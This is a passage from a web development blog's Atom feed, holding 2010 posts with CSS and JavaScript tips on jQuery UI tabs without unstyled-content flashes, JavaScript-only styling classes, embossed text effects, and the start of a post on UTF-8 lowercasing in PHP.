&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.ui-tabs-hide&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But if you look at your page now, you&amp;#39;ll see all your tabs content before they
get hidden. That is the FOUC I was talking about. The jQuery UI documentation
indicate that to remove it, you should directly add the &lt;code&gt;.ui-tabs-hide&lt;/code&gt; class
to panels you&amp;#39;ll want to hide.&lt;/p&gt;

&lt;p&gt;As also pointed in the doc, it will not gracefully degrade because users
without Javascript won&amp;#39;t even be able to see your other tabs. Also, it asks
you to add server-side logic (HTML markup with jQuery specific classes) for
something that should be handled entirely client-side.&lt;/p&gt;

&lt;h2&gt;Removing the FOUC while gracefully degrade&lt;/h2&gt;

&lt;p&gt;Ok, so what I did was writing two simple rules that will directly hide all
unused panels while still displaying the active one, even before jQuery UI
takes action.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.js&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.tabPanel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.tabPanel&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That way, no FOUC, and users without Javascript still see all the content.
Unfortunatly, if you now try clicking on your tabs, you&amp;#39;ll see that nothing
happens and you get stuck with your default panel always visible.&lt;/p&gt;

&lt;h2&gt;Fixing the jQuery UI tabs&lt;/h2&gt;

&lt;p&gt;As jQuery will add new classes to my elements, I&amp;#39;ll just have to write more
specific rules that use those classes. Here&amp;#39;s the little piece of logic I came
up with :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.js&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.tabPanel.ui-tabs-panel&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.js&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.tabPanel.ui-tabs-panel.ui-tabs-hide&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;All the jQuery panels are shown, except for the one hidden by jQuery. All
those rules being more and more specific, they will get applied once the tabs
are activated but still override the previous &lt;code&gt;display:&lt;/code&gt; declarations.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This is how I fixed an issue that was bugging me for years. Unfortunatly the
CSS rules being dependent on the markup used, I haven&amp;#39;t yet been able to write
them in a global form that could be added to the main jQuery UI css files.&lt;/p&gt;

&lt;p&gt;*[FOUC]: Flash Of Unstyled Content&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>CSS for Javascript enabled browsers</title>
   <link href="http://blog.pixelastic.com/2010/08/21/css-for-javascript-enabled-browsers/"/>
   <updated>2010-08-21T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/21/css-for-javascript-enabled-browsers</id>
   <content type="html">&lt;p&gt;In a previous post I was wondering if my way of loading js-specific CSS rules
was right. I was loading a specific css file for js overrides.&lt;/p&gt;

&lt;p&gt;This allow for lighter stylesheets for users without Javascript (they won&amp;#39;t
load useless rules), but also resulted in slower rendering for other users
because they needed to load two stylesheets instead of one.&lt;/p&gt;

&lt;p&gt;After much pondering, I now think that loading all the rules in one stylesheet
is the way to go.&lt;/p&gt;

&lt;p&gt;In addition with the number of request mentionned, keeping all your rules in
the same file is much more easier to maintain. Js-specific rules aren&amp;#39;t that
big either so the small additional bytes are usually better than a full http
request.&lt;/p&gt;

&lt;p&gt;I now prefix all my Javascript rules by &lt;code&gt;.js&lt;/code&gt;. I add a &lt;code&gt;js&lt;/code&gt; class to the &lt;code&gt;html
&lt;/code&gt;element directly from the &lt;code&gt;head&lt;/code&gt;, this helps in preventing any FOUC that may
occur because we add the class before the &lt;code&gt;body&lt;/code&gt; rendering.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;documentElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39; js&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Text emboss in CSS</title>
   <link href="http://blog.pixelastic.com/2010/08/19/text-emboss-in-css/"/>
   <updated>2010-08-19T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/19/text-emboss-in-css</id>
   <content type="html">&lt;p&gt;I know only two _unperfect _ways of displaying an emboss text in CSS. As we
can&amp;#39;t use inset shadows with &lt;code&gt;text-shadow&lt;/code&gt;, unlike &lt;code&gt;box-shadow&lt;/code&gt;, we have to
resort to other hacky ways.&lt;/p&gt;

&lt;p&gt;Let me show you what can be done.&lt;/p&gt;

&lt;h2&gt;Simulate it with an optical illusion&lt;/h2&gt;

&lt;p&gt;Instead of creating a real inner shadow, you can just create an optical
illusion by adding the correct shadow to make the viewer believe your text is
embossed.&lt;/p&gt;

&lt;p&gt;If you have dark text, just add a subtle white shadow at the bottom, while if
you have light text, just add a subtle black one at the top.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;emboss light&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Lorem ipsum&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;emboss dark&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Lorem ipsum&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.emboss&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.2em&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;50px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;font-weight&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;bold&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#0A539C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.light&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#FFFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;text-shadow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;-1px&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgba&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.dark&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;text-shadow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgba&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I added an &lt;code&gt;emboss&lt;/code&gt;class to more easily spot the effect, but the important
code is in the &lt;code&gt;light&lt;/code&gt;and &lt;code&gt;dark&lt;/code&gt;rules.&lt;/p&gt;

&lt;h2&gt;Add an almost transparent layer&lt;/h2&gt;

&lt;p&gt;For this second solution we will simply add a second layer with the exact same
text above the first text. Just slightly moving it and making it partly
transparent.&lt;/p&gt;

&lt;p&gt;You could add twice your element in your markup, but that would be bad for
accesibility as well as SEO, so we&amp;#39;ll instead use the &lt;code&gt;:before&lt;/code&gt; pseudo-class.&lt;/p&gt;

&lt;p&gt;We can set the &lt;code&gt;:before&lt;/code&gt; content using the &lt;code&gt;content:&lt;/code&gt; property, and we can
also use the&lt;code&gt;attr()&lt;/code&gt; method to get the content of one of our element&amp;#39;s
attributes. We just need to put the exact same text in one of our attributes
and we&amp;#39;re good to go.&lt;/p&gt;

&lt;p&gt;This can be easily done with a link and its &lt;code&gt;title&lt;/code&gt;attribute.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;emboss lightAgain&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Lorem ipsum&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Lorem ipsum&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;emboss darkAgain&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Lorem ipsum&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Lorem ipsum&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.lightAgain&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#FFFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;relative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.lightAgain&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:before&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rgba&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;50px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.darkAgain&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;relative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.darkAgain&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:before&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rgba&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;50px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The effect is much better with this technique but it also has it share of
drawback :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;You have to write your content twice, once in the element and once in an attribute&lt;/li&gt;
&lt;li&gt;You have to copy all your &lt;code&gt;padding&lt;/code&gt;rules in the &lt;code&gt;:before&lt;/code&gt;element or it won&amp;#39;t get correctly positionned&lt;/li&gt;
&lt;li&gt;You can&amp;#39;t select the text with this effect&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hope those two little techniques helped someone, anyway.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>How to hide/show elements based on Javascript</title>
   <link href="http://blog.pixelastic.com/2010/08/19/how-to-hide-show-elements-based-on-javascript/"/>
   <updated>2010-08-19T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/19/how-to-hide-show-elements-based-on-javascript</id>
   <content type="html">&lt;p&gt;Sometimes you have a really great design with some really fancy Javascript
goodness, like drag&amp;#39;n&amp;#39;drop and other shiny Ajaxy stuff.&lt;/p&gt;

&lt;p&gt;But when you browse the website with Javascript disabled, none of that works
and you end up with interface elements that should&amp;#39;nt be here because they do
not work.&lt;/p&gt;

&lt;p&gt;In those case, you&amp;#39;d rather display a nice message to your user, telling him
that he can&amp;#39;t use the feature withou Javascript enabled.&lt;/p&gt;

&lt;h2&gt;But how do you do that ?&lt;/h2&gt;

&lt;p&gt;Well, I myself load two different stylesheets. Remember that your website
should be working without Javascript, this is just the last layer you add.&lt;/p&gt;

&lt;p&gt;My default stylesheet will load all the rules for when Javascript is not
enabled. No fancy &lt;code&gt;cursor:move&lt;/code&gt; here.&lt;/p&gt;

&lt;p&gt;Then I load a second stylesheet using Javascript, using &lt;code&gt;document.write()&lt;/code&gt; in
the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;. And that&amp;#39;s in this one that I write rules that overload the
previous one. I add every styling that deals with Javascript-enabled features
here.&lt;/p&gt;

&lt;h2&gt;Limitations&lt;/h2&gt;

&lt;p&gt;I may be changing the way I load the JS stylesheet in the future. I don&amp;#39;t
really like relying on &lt;code&gt;document.write&lt;/code&gt; because it is &lt;em&gt;evil&lt;/em&gt;. I also don&amp;#39;t
like the idea of getting one extra request.&lt;/p&gt;

&lt;p&gt;I could add a &lt;code&gt;js&lt;/code&gt; class to my body element (like
&lt;a href=&quot;http://www.modernizr.com/&quot;&gt;modernizr&lt;/a&gt; does with all its CSS3 properties) and
then target elements by prepending &lt;code&gt;.js&lt;/code&gt; to the rule.&lt;/p&gt;

&lt;p&gt;But it means adding rules in my main CSS file for users without JS that will
still be downloading those extra useless bytes.&lt;/p&gt;

&lt;p&gt;I haven&amp;#39;t yet figured which way was the best (or should I say, the worst)&lt;/p&gt;

&lt;h2&gt;Convenient methodes&lt;/h2&gt;

&lt;p&gt;Whatever way you choose, one thing that really helped me was two real simple
classes : &lt;code&gt;jsOn&lt;/code&gt;and &lt;code&gt;jsOff&lt;/code&gt;that I add to elements.&lt;/p&gt;

&lt;p&gt;Elements with &lt;code&gt;jsOn&lt;/code&gt;will only be visible if Javascript is enabled and hidden
otherwise, while element with &lt;code&gt;jsOff&lt;/code&gt;will do the opposite.&lt;/p&gt;

&lt;p&gt;Assuming you mark your body element with a &lt;code&gt;js&lt;/code&gt; class if Javascript is
enabled, here&amp;#39;s how to do it :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jsOn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jsOn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jsOff&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jsOff&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hope all that helps at least someone.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Corrupted strings when using strtolower()</title>
   <link href="http://blog.pixelastic.com/2010/08/17/corrupted-strings-when-using-strtolower/"/>
   <updated>2010-08-17T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/17/corrupted-strings-when-using-strtolower</id>
   <content type="html">&lt;p&gt;&lt;em&gt;Little blog post at 5am, I&amp;#39;ll try to make it very short, I need some sleep.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;To avoid getting corrupted string results when calling &lt;code&gt;strtolower&lt;/code&gt;on UTF8
strings, you can call &lt;code&gt;mb_strtolowe&lt;/code&gt;r instead. The &lt;code&gt;mb_*&lt;/code&gt; functions are aware
of the utf8 encoding.&lt;/p&gt;

&lt;p&gt;Unfortunatly, sometime you just can&amp;#39;t, because the call is made in the cakePHP
